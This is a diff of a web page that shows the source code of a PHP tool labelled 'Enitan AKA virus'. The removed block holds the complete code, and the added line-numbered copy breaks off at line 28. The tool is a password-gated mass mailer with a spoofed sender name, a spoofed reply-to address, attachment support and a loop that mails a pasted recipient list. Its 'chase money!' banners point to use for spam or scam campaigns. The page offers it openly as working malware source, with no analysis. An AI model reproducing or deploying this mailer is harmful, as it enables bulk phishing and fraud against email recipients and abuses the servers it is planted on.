@@ -37,243 +37,243 @@
 
 <h3>Enitan AKA virus Source Code</h3>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
-<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="c1">//PASSWORD CONFIGURATION</span>
-<span class="o">@</span><span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
-<span class="nv">$chk_login</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
-<span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;kill&quot;</span><span class="p">;</span>
-<span class="c1">//END CONFIGURATION</span>
-<span class="k">if</span><span class="p">(</span><span class="nv">$pass</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span>
-<span class="p">{</span>
-<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$pass</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="k">if</span><span class="p">(</span><span class="nv">$chk_login</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
-<span class="p">{</span>
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$password</span><span class="p">)</span>
-<span class="p">{</span>
-<span class="k">die</span><span class="p">(</span><span class="s2">&quot;</span>
-<span class="s2"> &amp;lt;title&amp;gt;.:|enitan AKA Virus|:.&amp;lt;/title&amp;gt;</span>
-<span class="s2"> &amp;lt;center&amp;gt;</span>
-<span class="s2"> &amp;lt;table border=0 cellpadding=0 cellspacing=0 width=100% height=100%&amp;gt;</span>
-<span class="s2"> &amp;lt;tr&amp;gt;&amp;lt;td valign=middle align=center&amp;gt;</span>
-<span class="s2"> &amp;lt;table width=100 bgcolor=black border=6 bordercolor=#444444&amp;gt;</span>
-<span class="s2">   &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;</span>
-<span class="s2"> &amp;lt;font size=1 face=verdana&amp;gt;&amp;lt;center&amp;gt;</span>
-<span class="s2"> &amp;lt;b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;</span>
-<span class="s2"> &amp;lt;/center&amp;gt;</span>
-<span class="s2"> &amp;lt;form method=post&amp;gt;</span>
-<span class="s2"> &amp;lt;font size=1 face=verdana</span>
-<span class="s2">color=red&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;center&amp;gt;Mailer&amp;lt;/center&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="s2"> &amp;lt;input type=password name=pass size=30&amp;gt;</span>
-<span class="s2"> &amp;lt;/form&amp;gt;</span>
-<span class="s2"> &amp;lt;b&amp;gt;Host:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span>
-<span class="s2"> &amp;lt;b&amp;gt;IP:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span>
-<span class="s2"> &amp;lt;b&amp;gt;Your ip:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span>
-<span class="s2"> &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
-<span class="s2"> &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
-<span class="s2"> &quot;</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="p">}</span>
-<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">){</span>
-<span class="nv">$action</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">];</span>
-<span class="nv">$message</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">];</span>
-<span class="nv">$emaillist</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;emaillist&#39;</span><span class="p">];</span>
-<span class="nv">$from</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
-<span class="nv">$replyto</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;replyto&#39;</span><span class="p">];</span>
-<span class="nv">$subject</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">];</span>
-<span class="nv">$realname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;realname&#39;</span><span class="p">];</span>
-<span class="nv">$file_name</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
-<span class="nv">$contenttype</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contenttype&#39;</span><span class="p">];</span>
-       <span class="nv">$message</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
-       <span class="nv">$message</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;%5C%22&quot;</span><span class="p">,</span> <span class="s2">&quot;%22&quot;</span><span class="p">,</span> <span class="nv">$message</span><span class="p">);</span>
-       <span class="nv">$message</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
-       <span class="nv">$message</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
-       <span class="nv">$subject</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$subject</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="x"></span>
-<span class="x">&amp;lt;html&amp;gt;</span>
-<span class="x">&amp;lt;head&amp;gt;</span>
-<span class="x">&amp;lt;title&amp;gt;.:: mass mailer ::.&amp;lt;/title&amp;gt;</span>
-<span class="x">&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&amp;gt;</span>
-<span class="x">&amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
-<span class="x">&amp;lt;!--</span>
-<span class="x">.style1 {</span>
-<span class="x">       font-family: Geneva, Arial, Helvetica, sans-serif;</span>
-<span class="x">       font-size: 12px;</span>
-<span class="x">}</span>
-<span class="x">--&amp;gt;</span>
-<span class="x">&amp;lt;/style&amp;gt;</span>
-<span class="x">&amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
-<span class="x">&amp;lt;!--</span>
-<span class="x">.style1 {</span>
-<span class="x">       font-size: 20px;</span>
-<span class="x">       font-family: Geneva, Arial, Helvetica, sans-serif;</span>
-<span class="x">}</span>
-<span class="x">body {</span>
-<span class="x">   background-color: #000000;</span>
-<span class="x">}</span>
-<span class="x">.style2 {font-family: Georgia, &quot;Times New Roman&quot;, Times, serif}</span>
-<span class="x">.style3 {</span>
-<span class="x">   color: #FF0000;</span>
-<span class="x">   font-weight: bold;</span>
-<span class="x">}</span>
-<span class="x">.style4 {color: #999999}</span>
-<span class="x">--&amp;gt;</span>
-<span class="x">&amp;lt;/style&amp;gt;</span>
-<span class="x">&amp;lt;/head&amp;gt;</span>
-<span class="x">&amp;lt;body text=&quot;#ffffff&quot;&amp;gt;</span>
-<span class="x">&amp;lt;span class=&quot;style1&quot;&amp;gt;</span>
-<span class="x">&amp;lt;center&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x"> &amp;lt;SPAN lang=ar-sa&amp;gt;&amp;lt;FONT style=&quot;FONT-SIZE: 70pt&quot;</span>
-<span class="x">face=Webdings</span>
-<span class="x">color=#ff0000&amp;gt;!&amp;lt;/FONT&amp;gt;&amp;lt;/SPAN&amp;gt;&amp;lt;/FONT&amp;gt;&amp;lt;/br&amp;gt;</span>
-<span class="x">&amp;lt;/center&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;</span>
-<span class="x">&amp;lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;send&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;br&amp;gt;</span>
-<span class="x"> &amp;lt;table width=&quot;100%&quot; border=&quot;0&quot;&amp;gt;</span>
-<span class="x">   &amp;lt;tr&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
-<span class="x">Helvetica, sans-serif&quot;&amp;gt;Email:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
-<span class="x">     &amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;18%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
-<span class="x">sans-serif&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;input type=&quot;text&quot; name=&quot;from&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$from</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;</span>
-<span class="x">size=&quot;30&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;31%&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
-<span class="x">Helvetica, sans-serif&quot;&amp;gt;Name:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
-<span class="x">     &amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;41%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
-<span class="x">sans-serif&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;input type=&quot;text&quot; name=&quot;realname&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$realname</span><span class="p">;</span>
-<span class="cp">?&gt;</span><span class="x">&quot; size=&quot;30&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
-<span class="x">   &amp;lt;/tr&amp;gt;</span>
-<span class="x">   &amp;lt;tr&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
-<span class="x">Helvetica, sans-serif&quot;&amp;gt;Reply:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
-<span class="x">     &amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;18%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
-<span class="x">sans-serif&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;input type=&quot;text&quot; name=&quot;replyto&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$replyto</span><span class="p">;</span>
-<span class="cp">?&gt;</span><span class="x">&quot; size=&quot;30&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;31%&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
-<span class="x">Helvetica, sans-serif&quot;&amp;gt;Attach</span>
-<span class="x">         File:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
-<span class="x">     &amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;41%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
-<span class="x">sans-serif&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;input type=&quot;file&quot; name=&quot;file&quot; size=&quot;30&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
-<span class="x">   &amp;lt;/tr&amp;gt;</span>
-<span class="x">   &amp;lt;tr&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
-<span class="x">Helvetica, sans-serif&quot;&amp;gt;Subject:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
-<span class="x">     &amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td colspan=&quot;3&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica,</span>
-<span class="x">sans-serif&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;input type=&quot;text&quot; name=&quot;subject&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$subject</span><span class="p">;</span>
-<span class="cp">?&gt;</span><span class="x">&quot; size=&quot;66&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
-<span class="x">   &amp;lt;/tr&amp;gt;</span>
-<span class="x">   &amp;lt;tr&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;10%&quot; valign=&quot;top&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial,</span>
-<span class="x">Helvetica, sans-serif&quot;&amp;gt;Mail:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
-<span class="x">     &amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;18%&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana,</span>
-<span class="x">Arial, Helvetica,</span>
-<span class="x">sans-serif&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;textarea name=&quot;message&quot; cols=&quot;50&quot; rows=&quot;10&quot;&amp;gt;</span><span class="cp">&lt;?</span> <span class="k">print</span>
-<span class="nv">$message</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;</span>
-<span class="x">       &amp;lt;br&amp;gt;</span>
-<span class="x">       &amp;lt;input type=&quot;radio&quot; name=&quot;contenttype&quot; value=&quot;plain&quot;&amp;gt;</span>
-<span class="x">       Text</span>
-<span class="x">       &amp;lt;input name=&quot;contenttype&quot; type=&quot;radio&quot; value=&quot;html&quot; checked&amp;gt;</span>
-<span class="x">       HTML</span>
-<span class="x">       &amp;lt;input type=&quot;submit&quot; value=&quot;BomB WellA&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;31%&quot; valign=&quot;top&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;div align=&quot;right&quot;&amp;gt;</span>
-<span class="x">         &amp;lt;font face=&quot;Verdana, Arial,</span>
-<span class="x">Helvetica, sans-serif&quot; size=&quot;-3&quot;&amp;gt;Mail  to:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
-<span class="x">     &amp;lt;/td&amp;gt;</span>
-<span class="x">     &amp;lt;td width=&quot;41%&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana,</span>
-<span class="x">Arial, Helvetica, sans-serif&quot;&amp;gt;</span>
-<span class="x">       &amp;lt;textarea name=&quot;emaillist&quot; cols=&quot;30&quot; rows=&quot;10&quot;&amp;gt;</span><span class="cp">&lt;?</span> <span class="k">print</span>
-<span class="nv">$emaillist</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
-<span class="x">   &amp;lt;/tr&amp;gt;</span>
-<span class="x"> &amp;lt;/table&amp;gt;</span>
-<span class="x">&amp;lt;/form&amp;gt;</span>
-<span class="cp">&lt;?</span>
-<span class="k">if</span> <span class="p">(</span><span class="nv">$action</span><span class="p">){</span>
-       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$from</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$subject</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$message</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$emaillist</span><span class="p">){</span>
-       <span class="k">print</span> <span class="s2">&quot;Please complete all fields before sending your message.&quot;</span><span class="p">;</span>
-       <span class="k">exit</span><span class="p">;</span>
-   <span class="p">}</span>
-   <span class="nv">$allemails</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$emaillist</span><span class="p">);</span>
-           <span class="nv">$numemails</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$allemails</span><span class="p">);</span>
-         <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$x</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$numemails</span><span class="p">;</span> <span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
-               <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$allemails</span><span class="p">[</span><span class="nv">$x</span><span class="p">];</span>
-               <span class="k">if</span> <span class="p">(</span><span class="nv">$to</span><span class="p">){</span>
-               <span class="nv">$to</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
-               <span class="nv">$message</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;&amp;email&amp;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">,</span> <span class="nv">$message</span><span class="p">);</span>
-               <span class="nv">$subject</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;&amp;email&amp;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">);</span>
-               <span class="k">print</span> <span class="s2">&quot; </span><span class="si">$to</span><span class="s2">.......&quot;</span><span class="p">;</span>
-               <span class="nb">flush</span><span class="p">();</span>
-               <span class="nv">$header</span> <span class="o">=</span> <span class="s2">&quot;From: </span><span class="si">$realname</span><span class="s2"> &amp;lt;</span><span class="si">$from</span><span class="s2">&amp;gt;</span><span class="se">\r\n</span><span class="s2">Reply-To: </span><span class="si">$replyto\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
-               <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;MIME-Version: 1.0</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
-           <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: multipart/mixed;</span>
-<span class="s2">boundary=</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
-             <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;--</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
-               <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: text/</span><span class="si">$contenttype\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
-               <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Transfer-Encoding: 8bit</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
-               <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$message\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
-           <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;--</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
-           <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: </span><span class="si">$file_type</span><span class="s2">;</span>
-<span class="s2">name=</span><span class="se">\&quot;</span><span class="si">$file_name\</span><span class="s2">&quot;</span><span class="nx">\r\n</span><span class="s2">&quot;;</span>
-<span class="s2">           If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Transfer</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">base64\r\n</span><span class="s2">&quot;;</span>
-<span class="s2">           If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span>
-<span class="nx">attachment</span><span class="p">;</span> <span class="nx">filename</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$file_name\</span><span class="s2">&quot;</span><span class="nx">\r\n\r\n</span><span class="s2">&quot;;</span>
-<span class="s2">           If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nv">$content\r\n</span><span class="s2">&quot;;</span>
-<span class="s2">           If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="o">--</span><span class="nv">$uid</span><span class="o">--</span><span class="s2">&quot;;</span>
-<span class="s2">               mail(</span><span class="si">$to</span><span class="s2">, </span><span class="si">$subject</span><span class="s2">, &quot;&quot;, </span><span class="si">$header</span><span class="s2">);</span>
-<span class="s2">               print &quot;</span><span class="nx">chase</span> <span class="nx">money</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
-<span class="s2">               flush();</span>
-<span class="s2">               }</span>
-<span class="s2">               }</span>
-<span class="s2">}</span>
-<span class="s2">?&gt;</span>
-<span class="s2">&amp;lt;style type=&quot;</span><span class="nx">text</span><span class="o">/</span><span class="nx">css</span><span class="s2">&quot;&amp;gt;</span>
-<span class="s2">&amp;lt;!--</span>
-<span class="s2">.style1 {</span>
-<span class="s2">   font-size: 20px;</span>
-<span class="s2">   font-family: Geneva, Arial, Helvetica, sans-serif;</span>
-<span class="s2">}</span>
-<span class="s2">--&amp;gt;</span>
-<span class="s2">&amp;lt;/style&amp;gt;&amp;lt;center&amp;gt;</span>
-<span class="s2">&amp;lt;p class=&quot;</span><span class="nx">style1</span> <span class="nx">style2</span> <span class="nx">style3</span> <span class="nx">style4</span><span class="s2">&quot;&amp;gt;&amp;lt;p class=&quot;</span><span class="nx">style1</span><span class="s2">&quot;&amp;gt;PHP Mailer&amp;lt;br&amp;gt;</span>
-<span class="s2"> &amp;copy enitan4evil@hotmail.com&amp;lt;br&amp;gt;</span>
-<span class="s2">     &amp;lt;/p&amp;gt;  &amp;lt;/p&amp;gt;</span>
-<span class="s2">&amp;lt;/center&amp;gt;</span>
-<span class="s2">&lt;?php</span>
-<span class="s2">if(isset(</span><span class="si">$_POST[&#39;action&#39;]</span><span class="s2">) &amp;&amp; </span><span class="si">$numemails</span><span class="s2"> !==0 ){echo</span>
-<span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Sending Completed\\r\\nTotal Email</span>
-<span class="s1">$numemails\\r\\n-Shout Lastborn and Hustle On!&#39;</span><span class="p">);</span>
-<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
-<span class="s2">?&gt;</span>
-<span class="s2">&amp;lt;/body&amp;gt;</span>
-<span class="s2">&amp;lt;/html&amp;gt;</span></code></pre></div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">  1</span> <span class="cp">&lt;?php</span>
+<span class="lineno">  2</span> <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
+<span class="lineno">  3</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="lineno">  4</span> <span class="c1">//PASSWORD CONFIGURATION</span>
+<span class="lineno">  5</span> <span class="o">@</span><span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
+<span class="lineno">  6</span> <span class="nv">$chk_login</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+<span class="lineno">  7</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;kill&quot;</span><span class="p">;</span>
+<span class="lineno">  8</span> <span class="c1">//END CONFIGURATION</span>
+<span class="lineno">  9</span> <span class="k">if</span><span class="p">(</span><span class="nv">$pass</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span>
+<span class="lineno"> 10</span> <span class="p">{</span>
+<span class="lineno"> 11</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$pass</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno"> 12</span> <span class="p">}</span>
+<span class="lineno"> 13</span> <span class="k">if</span><span class="p">(</span><span class="nv">$chk_login</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
+<span class="lineno"> 14</span> <span class="p">{</span>
+<span class="lineno"> 15</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$password</span><span class="p">)</span>
+<span class="lineno"> 16</span> <span class="p">{</span>
+<span class="lineno"> 17</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;</span>
+<span class="lineno"> 18</span> <span class="s2"> &amp;lt;title&amp;gt;.:|enitan AKA Virus|:.&amp;lt;/title&amp;gt;</span>
+<span class="lineno"> 19</span> <span class="s2"> &amp;lt;center&amp;gt;</span>
+<span class="lineno"> 20</span> <span class="s2"> &amp;lt;table border=0 cellpadding=0 cellspacing=0 width=100% height=100%&amp;gt;</span>
+<span class="lineno"> 21</span> <span class="s2"> &amp;lt;tr&amp;gt;&amp;lt;td valign=middle align=center&amp;gt;</span>
+<span class="lineno"> 22</span> <span class="s2"> &amp;lt;table width=100 bgcolor=black border=6 bordercolor=#444444&amp;gt;</span>
+<span class="lineno"> 23</span> <span class="s2">   &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;</span>
+<span class="lineno"> 24</span> <span class="s2"> &amp;lt;font size=1 face=verdana&amp;gt;&amp;lt;center&amp;gt;</span>
+<span class="lineno"> 25</span> <span class="s2"> &amp;lt;b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;</span>
+<span class="lineno"> 26</span> <span class="s2"> &amp;lt;/center&amp;gt;</span>
+<span class="lineno"> 27</span> <span class="s2"> &amp;lt;form method=post&amp;gt;</span>
+<span class="lineno"> 28</span> <span class="s2"> &amp;lt;font size=1 face=verdana</span>
